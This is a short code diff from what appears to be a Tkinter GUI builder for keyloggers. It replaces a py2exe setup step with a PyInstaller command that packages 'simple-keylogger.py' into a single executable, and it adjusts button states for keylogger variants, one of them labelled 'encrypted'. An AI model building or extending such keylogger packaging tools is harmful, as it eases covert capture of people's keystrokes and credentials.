@@ -44,15 +44,10 @@ def convert_to_exe():
     if response:
 
         tk.Label(root, text="The script will be converted to an EXE file.").pack(pady=10, padx=10)
-        
-        with open('setup.py','w') as setup:
-            setup.write("""
-from distutils.core import setup
-import py2exe
 
+        subprocess.run(['python', '-m', 'PyInstaller', '--onefile', 'simple-keylogger.py'])
 
-setup(console=['simple-keylogger.py'])
-""")
+        tk.Label(root, text="Your script has been converted to an exe file").pack(pady=10, padx=10)
 
     else:
 
@@ -68,6 +63,7 @@ def disable_other_buttons(selected_button):
     
     if selected_button != "encrypted":
         keylogger_button_3.config(state="disabled")
+
 
 # Init Tkinter
 root = tk.Tk()
